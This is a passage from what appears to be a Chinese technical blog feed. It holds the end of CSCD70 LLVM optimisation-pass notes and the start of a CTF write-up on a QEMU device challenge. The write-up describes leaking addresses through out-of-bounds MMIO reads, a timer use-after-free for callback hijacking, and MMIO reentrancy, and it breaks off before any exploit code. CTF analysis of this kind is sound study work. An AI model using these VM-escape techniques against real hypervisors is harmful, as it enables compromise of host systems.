class="built_in">getOpcode</span>())</span><br><span class="line">        {</span><br><span class="line">          <span class="comment">//x+0 x-0 --&gt; x</span></span><br><span class="line">        <span class="keyword">case</span> Instruction::Add:</span><br><span class="line">        <span class="keyword">case</span> Instruction::Sub:</span><br><span class="line">          <span class="keyword">if</span>((<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1)&amp;&amp;!ConstVal1)||(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2)&amp;&amp;!ConstVal2))</span><br><span class="line">          {</span><br><span class="line">            AlgebraicIdentity = oper1 ? oper1 : oper2;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> Instruction::Mul:</span><br><span class="line">        <span class="keyword">case</span> Instruction::SDiv:</span><br><span class="line">          <span class="keyword">if</span>((<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1)&amp;&amp;ConstVal1==<span class="number">1</span>)||(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2)&amp;&amp;ConstVal2==<span class="number">1</span>))</span><br><span class="line">          {</span><br><span class="line">            AlgebraicIdentity = ConstVal1==<span class="number">1</span>? oper2 : oper1;</span><br><span class="line">            flag = <span class="literal">true</span>; </span><br><span class="line">          }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        {</span><br><span class="line">          In.<span class="built_in">replaceAllUsesWith</span>(AlgebraicIdentity);</span><br><span class="line">          del_InsList.<span class="built_in">push_back</span>(&amp;In);</span><br><span class="line">          ++cnt;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">delIns</span>(del_InsList);</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"define dso_local void @AlgebraicIdentity(i32 noundef %0) {"</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Algebraic Identity: "</span> &lt;&lt; cnt &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">none</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; opt -load-pass-plugin=./libLocalOpts.so -passes=algebraic-identity ./test/TestCase1.ll -o ./TestCase.bc &amp;&amp; llvm-dis TestCase.bc -o TestCase.ll</span><br></pre></td></tr></tbody></table></figure><p>优化前:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @AlgebraicIdentity(i32 noundef %0) {</span><br><span class="line">  %2 = add nsw i32 %0, 0</span><br><span class="line">  %3 = add nsw i32 0, %0</span><br><span class="line">  %4 = mul nsw i32 %0, 1</span><br><span class="line">  %5 = mul nsw i32 1, %0</span><br><span class="line">  %6 = sub nsw i32 %0, 0</span><br><span class="line">  %7 = sdiv i32 %0, 1</span><br><span class="line">  %8 = call i32 (ptr, ...) @printf(ptr noundef @.str, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6, i32 noundef %7)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>优化后:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @AlgebraicIdentity(i32 noundef %0) {</span><br><span class="line">  %2 = call i32 (ptr, ...) @printf(ptr noundef @.str, i32 noundef %0, i32 noundef 0, i32 noundef %0, i32 noundef %0, i32 noundef %0, i32 noundef 1)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="强度削弱"><a href="#强度削弱" class="headerlink" title="强度削弱"></a>强度削弱</h2><h3 id="识别-1"><a href="#识别-1" class="headerlink" title="识别"></a>识别</h3><p>乘除运算,其中一个操作数为2的幂.</p><h3 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h3><p>在原指令下方增加一条移位指令,移除并删除原指令.这里要用到IRBuilder.<br>用当前指令来初始化builder,为其设置指令的插入点.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IRBuilder&lt;&gt; <span class="built_in">builder</span>(&amp;In);</span><br><span class="line">Value* NewIns = builder.<span class="built_in">CreateShl</span>(oper,shift);</span><br><span class="line">In.<span class="built_in">replaceAllUsesWith</span>(NewIns);</span><br></pre></td></tr></tbody></table></figure><h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getshift</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">if</span>(!((x &gt; <span class="number">0</span>) &amp;&amp; !(x &amp; (x - <span class="number">1</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span>(x)</span><br><span class="line">  {</span><br><span class="line">    x = x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    ++i;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">StrengthReductionPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             FunctionAnalysisManager &amp;)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  std::vector&lt;Instruction*&gt; del_InsList;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : F)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : BB)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">      {</span><br><span class="line">        <span class="type">int</span> shift = <span class="number">0</span>;</span><br><span class="line">        Value* oper;</span><br><span class="line">        <span class="keyword">auto</span> oper1 =In.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">auto</span> oper2 =In.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> shift1 = <span class="number">-1</span>,shift2 = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1))</span><br><span class="line">          shift1 = <span class="built_in">getshift</span>(<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper1)-&gt;<span class="built_in">getSExtValue</span>());</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2))</span><br><span class="line">          shift2 = <span class="built_in">getshift</span>(<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper2)-&gt;<span class="built_in">getSExtValue</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">        {</span><br><span class="line">        <span class="keyword">case</span> Instruction::Mul:</span><br><span class="line">        <span class="keyword">case</span> Instruction::SDiv:</span><br><span class="line">        <span class="keyword">case</span> Instruction::UDiv:</span><br><span class="line">          <span class="keyword">if</span>((<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1)&amp;&amp;shift1!=<span class="number">-1</span>)||(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2)&amp;&amp;shift2!=<span class="number">-1</span>))</span><br><span class="line">          {</span><br><span class="line">            shift = shift1==<span class="number">-1</span> ? shift2 : shift1;</span><br><span class="line">            oper = shift1==<span class="number">-1</span>? oper1 : oper2;</span><br><span class="line">            </span><br><span class="line">            IRBuilder&lt;&gt; <span class="built_in">builder</span>(&amp;In);</span><br><span class="line">            </span><br><span class="line">            Value* NewIns;</span><br><span class="line">            <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">            {</span><br><span class="line">            <span class="keyword">case</span> Instruction::Mul:</span><br><span class="line">              NewIns = builder.<span class="built_in">CreateShl</span>(oper,shift);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Instruction::SDiv:</span><br><span class="line">            <span class="keyword">case</span> Instruction::UDiv:</span><br><span class="line">              NewIns =builder.<span class="built_in">CreateAShr</span>(oper,shift);</span><br><span class="line">              <span class="keyword">break</span>;            </span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            In.<span class="built_in">replaceAllUsesWith</span>(NewIns);</span><br><span class="line">            del_InsList.<span class="built_in">push_back</span>(&amp;In);</span><br><span class="line">            cnt++;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">delIns</span>(del_InsList);</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"define dso_local void @StrengthReduction(i32 noundef %0) {"</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"strength-reduction: "</span> &lt;&lt; cnt &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">none</span>();</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; opt -load-pass-plugin=./libLocalOpts.so -passes=algebraic-identity,strength-reduction ./test/TestCase2.ll -o ./TestCase.bc &amp;&amp; llvm-dis TestCase.bc -o TestCase.ll</span><br></pre></td></tr></tbody></table></figure><p>优化前:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @StrengthReduction(i32 noundef %0) {</span><br><span class="line">  %2 = mul nsw i32 %0, 2</span><br><span class="line">  %3 = mul nsw i32 64, %0</span><br><span class="line">  %4 = sdiv i32 %0, 4</span><br><span class="line">  %5 = sdiv i32 %0, 128</span><br><span class="line">  %6 = call i32 (ptr, ...) @printf(ptr noundef @.str.1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>优化后:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @StrengthReduction(i32 noundef %0) {</span><br><span class="line">  %2 = shl i32 %0, 1</span><br><span class="line">  %3 = shl i32 %0, 6</span><br><span class="line">  %4 = ashr i32 %0, 2</span><br><span class="line">  %5 = ashr i32 %0, 7</span><br><span class="line">  %6 = call i32 (ptr, ...) @printf(ptr noundef @.str.1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Multi-Instruction-Optimization"><a href="#Multi-Instruction-Optimization" class="headerlink" title="Multi-Instruction Optimization"></a>Multi-Instruction Optimization</h2><h3 id="识别-2"><a href="#识别-2" class="headerlink" title="识别"></a>识别</h3><p>以先加后减运算为例: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = a+b;d = c-a;  --&gt;  c = a+b;d = b;</span><br></pre></td></tr></tbody></table></figure><p>对于指令In,遍历其UserIn,如果UserIn的操作符含义与In的操作符相反(如加与减,乘与除),且UserIn的第二个操作数(减数)与In的任一操作数(加数)均为对同一个Value的引用.</p><p>其实就是UserIn正好抵消In的运算,具体是否可消除模式的识别与操作符本身有关,这里仅以上述先加后减的模式进行优化.</p><h3 id="优化-2"><a href="#优化-2" class="headerlink" title="优化"></a>优化</h3><p>以之前的值替换即可.</p><h3 id="完整代码-2"><a href="#完整代码-2" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PreservedAnalyses <span class="title">MultiInstOptPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        FunctionAnalysisManager &amp;)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  std::vector&lt;Instruction*&gt; del_InsList;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : F)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : BB)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">      {</span><br><span class="line">        <span class="type">int</span> op = <span class="number">-1</span> ; <span class="comment">//1 -&gt; + ; 0 -&gt; -;</span></span><br><span class="line">        <span class="type">int</span> Incnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">auto</span> oper1 = In.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">auto</span> oper2 = In.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">        {</span><br><span class="line">        <span class="keyword">case</span> Instruction::Add:</span><br><span class="line">          <span class="keyword">for</span>(User* user:In.<span class="built_in">users</span>())</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span>(Instruction* UserIn = <span class="built_in">dyn_cast</span>&lt;Instruction&gt;(user))</span><br><span class="line">            {</span><br><span class="line">              Value* Val = <span class="literal">NULL</span>;</span><br><span class="line">              <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(UserIn-&gt;<span class="built_in">getOpcode</span>() == Instruction::Sub)</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span>(UserIn-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>) == oper1)</span><br><span class="line">                    Val = oper2;</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span>(UserIn-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>) == oper2)</span><br><span class="line">                    Val = oper1;</span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span>(Val)</span><br><span class="line">                  {</span><br><span class="line">                    UserIn-&gt;<span class="built_in">replaceAllUsesWith</span>(Val);  </span><br><span class="line">                    del_InsList.<span class="built_in">push_back</span>(UserIn);</span><br><span class="line">                    ++cnt;</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">delIns</span>(del_InsList);</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"define dso_local void @MultiInstOpt(i32 noundef %0, i32 noundef %1) {"</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"multi-inst-opt: "</span> &lt;&lt; cnt &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">none</span>();</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; opt -load-pass-plugin=./libLocalOpts.so -passes=algebraic-identity,strength-reduction,multi-inst-opt ./test/TestCaseBasic.ll -o ./TestCase.bc &amp;&amp; llvm-dis TestCase.bc -o TestCase.ll</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @MultiInstOpt(i32 noundef %0, i32 noundef %1) {</span><br><span class="line">  %3 = add nsw i32 %0, 3</span><br><span class="line">  %4 = sub nsw i32 %3, 3</span><br><span class="line">  %5 = add nsw i32 %0, %1</span><br><span class="line">  %6 = sub nsw i32 %5, %1</span><br><span class="line">  %7 = call i32 (ptr, ...) @printf(ptr noundef @.str.1, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @MultiInstOpt(i32 noundef %0, i32 noundef %1) {</span><br><span class="line">  %3 = add nsw i32 %0, 3</span><br><span class="line">  %4 = add nsw i32 %0, %1</span><br><span class="line">  %5 = call i32 (ptr, ...) @printf(ptr noundef @.str.1, i32 noundef %3, i32 noundef %0, i32 noundef %4, i32 noundef %0)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 静态分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
            <tag> CSCD70 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>京麒CTF2023 qemu-mr MMIO重入攻击</title>
      <link href="/2023/JQCTF223%20Qemu-mr%20Recursive-MMIO-Flaws/"/>
      <url>/2023/JQCTF223%20Qemu-mr%20Recursive-MMIO-Flaws/</url>
      
        <content type="html"><![CDATA[<p>有趣的MMIO重入</p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>关键结构体长这样</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MRState</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="type">uint64_t</span> chunk_size;</span><br><span class="line">  <span class="type">int64_t</span> read_size;</span><br><span class="line">  <span class="type">uint64_t</span> read_flag;</span><br><span class="line">  <span class="type">uint64_t</span> free_flag;</span><br><span class="line">  <span class="type">uint64_t</span> chunk_flag;</span><br><span class="line">  <span class="type">uint64_t</span> timer_flag;</span><br><span class="line">  <span class="type">uint64_t</span> clear_flag;</span><br><span class="line">  <span class="type">uint64_t</span> bh_flag;</span><br><span class="line">  <span class="type">uint64_t</span> bh_rw_flag;</span><br><span class="line">  <span class="type">uint64_t</span> physical;</span><br><span class="line">  QEMUTimer_0 *timer;</span><br><span class="line">  <span class="type">char</span> *chunk_ptr;</span><br><span class="line">  <span class="type">uint64_t</span> blk[<span class="number">8</span>];</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>mmio_read,一眼丁真的负数溢出.(ps:上面那个比较是无符号比较,没有负数溢出),结合MRState结构体来看,向上溢出读timer指针能够拿到主线程的堆地址,读chunk_ptr能拿到当前线程的堆地址,作为一个Object,可以从基类的free指针中拿到ELF程序的加载地址.<br>(其实按照以前用户态glibc利用的经验,mmap出的多片内存区域的偏移应该是固定的,而线程堆是mmap出来的,讲道理应该能从得到的线程堆地址间接计算libc的地址,但在之前的一些尝试中,这些偏移并不固定.如果有师傅知道为什么,真心求教.)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312032058341.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>; <span class="comment">//free -&gt; g_free in ELF.</span></span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>mmio_write可以设置除了clear_flag外的其他flag,然后根据flag执行对应的操作(仅展示操作部分).操作有: 1) dma读写 2) 分配&lt;0x200大小的堆块并从物理地址读取数据. 3)设置timer 4) 释放timer.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312032101421.png"></p><p>一看堆的chunk_size可控,且mmio_write时没加锁,于是想到打条件竞争,在一个线程malloc之后,另一个线程进入mmio_write修改chunk_size变量,达成堆溢出.但是观察下面的free操作后,会将clear_flag设置为1,这意味着mmio_write将不再可用,我们仅有1次free操作.而且能溢出的堆块和要释放的堆块甚至不在同一个线程的堆区中(timer空间在qemu主线程中分配,chunk_ptr在触发mmio_write的线程中分配),感觉不太好打.</p><p>于是换一条路走.再来关注这个free掉timer的操作,结合前两天跟的<a href="https://hanqi-blogs.cn/2023/QemuTimer-Callback">QemuTimer Callback机制</a>,瞬间想到这里有个天然的UAF.在激活timer后,timer已经加入到了active_timerlist中,在MRState中将Timer置零没有完全消除对timer结构的访问能力.结合刚刚的堆块分配操作,将释放的timer拿回来并在Timer触发之前劫持其callback指针及参数,即可达成一次任意函数调用.不过还是刚刚的问题,clear_flag会被置1,没办法再次分配堆块.那就再打竞争,在释放timer后设置clear_flag前让另一个线程进行堆块分配并劫持.</p><p>这种方法最终也没有成功,即使我尝试使用gdb控制程序的时序来赢得竞争,但我发现似乎多个线程不能同时进行mmio_write,.(这一点在之后会解释)</p><p>后来根据题目提示,找到了 <a href="https://github.com/QiuhaoLi/CVE-2021-3929-3947">https://github.com/QiuhaoLi/CVE-2021-3929-3947</a> 以及white paper.了解mmio重入的基本原理.<br>于是先将physical地址设置为mmio区域的物理地址,设置好对应标志位,经过这样的过程:<br>先第一次进入mmio_write,向physical区域写入触发mmio重入,第二次进入mmio_write分配chunk并写入(无效操作),激活timer,释放timer.此时clear_flag已经设置,但当第二次mmio_write结束会直接返回到刚刚写入physical区域的指令,也就是检测clear_flag之后,之后即可正常劫持timer.</p><p>引用一下论文中的对MMIO重入的描述.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312032217351.png"></p><p>论文中也提到了在最开始的尝试中无法同时进入mmio_write的原因.</p><blockquote><p>In QEMU,PMIO/MMIO accesses from the guest are protected by a global lock “Big QEMU Lock”[27],so two vCPUs can not simultaneously call into virtual devices.</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 